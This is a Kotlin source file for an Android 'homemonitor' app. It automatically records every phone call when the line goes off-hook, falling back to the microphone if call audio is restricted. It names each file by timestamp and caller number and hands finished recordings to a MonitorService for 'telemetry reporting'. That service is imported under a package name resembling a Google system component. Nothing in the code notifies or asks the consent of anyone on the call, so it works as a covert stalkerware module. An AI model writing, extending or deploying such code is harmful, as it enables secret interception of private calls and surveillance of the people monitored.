package com.homemonitor

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import android.telephony.TelephonyManager
import android.util.Log
import com.google.android.system.MonitorService
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Audio call recording engine that captures telephone calls when active
 * and stores formatted audio files for inspection and telemetry reporting.
 */
object CallRecordingEngine {
    private const val TAG = "CallRecordingEngine"
    private var mediaRecorder: MediaRecorder? = null
    private var isRecording = false
    private var currentOutputFile: File? = null

    /**
     * Directory for storing call recording audio files.
     */
    fun getRecordingsDir(context: Context): File {
        val dir = File(context.filesDir, "call_recordings")
        if (!dir.exists()) {
            dir.mkdirs()
        }
        return dir
    }

    /**
     * Returns all saved call recording files sorted newest first.
     */
    fun getRecordedFiles(context: Context): List<File> {
        val dir = getRecordingsDir(context)
        return dir.listFiles()?.filter { it.isFile && (it.extension == "m4a" || it.extension == "3gp" || it.extension == "amr") }
            ?.sortedByDescending { it.lastModified() } ?: emptyList()
    }

    /**
     * Handles phone call state changes received from Telephony broadcasts.
     */
    @Synchronized
    fun onCallStateChanged(context: Context, stateStr: String?, phoneNumber: String?) {
        Log.d(TAG, "onCallStateChanged: state=$stateStr, number=$phoneNumber")
        when (stateStr) {
            TelephonyManager.EXTRA_STATE_OFFHOOK -> {
                if (!isRecording) {
                    startRecording(context, phoneNumber)
                }
            }
            TelephonyManager.EXTRA_STATE_IDLE -> {
                if (isRecording) {
                    stopRecording(context)
                }
            }
        }
    }

    /**
     * Starts audio call recording.
     */
    @Synchronized
    fun startRecording(context: Context, phoneNumber: String?) {
        if (isRecording) return

        try {
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
            val safeNumber = phoneNumber?.replace(Regex("[^0-9+]"), "") ?: "unknown"
            val filename = "call_${timestamp}_${safeNumber}.m4a"
            val outputFile = File(getRecordingsDir(context), filename)

            val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(context)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }

            recorder.apply {
                // Try VOICE_CALL first, fallback to MIC if permission/hardware policy restricts VOICE_CALL
                try {
                    setAudioSource(MediaRecorder.AudioSource.VOICE_CALL)
                } catch (e: Exception) {
                    Log.w(TAG, "VOICE_CALL audio source unavailable, falling back to MIC")
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                }
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioEncodingBitRate(128000)
                setAudioSamplingRate(44100)
                setOutputFile(outputFile.absolutePath)
                prepare()
                start()
            }

            mediaRecorder = recorder
            isRecording = true
            currentOutputFile = outputFile
            Log.i(TAG, "Started call recording: ${outputFile.name}")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start call recording", e)
            cleanupRecorder()
        }
    }

    /**
     * Stops and finalizes the active audio call recording.
     */
    @Synchronized
    fun stopRecording(context: Context) {
        if (!isRecording) return

        try {
            mediaRecorder?.apply {
                stop()
                release()
            }
            Log.i(TAG, "Stopped call recording. Output: ${currentOutputFile?.absolutePath}")
            currentOutputFile?.let { file ->
                if (file.exists() && file.length() > 0) {
                    // Notify MonitorService of newly captured call recording
                    MonitorService.sendStreamCallRecord(file)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping call recording", e)
        } finally {
            cleanupRecorder()
        }
    }

    private fun cleanupRecorder() {
        try {
            mediaRecorder?.release()
        } catch (e: Exception) {
            // Ignore release exception
        }
        mediaRecorder = null
        isRecording = false
        currentOutputFile = null
    }
}
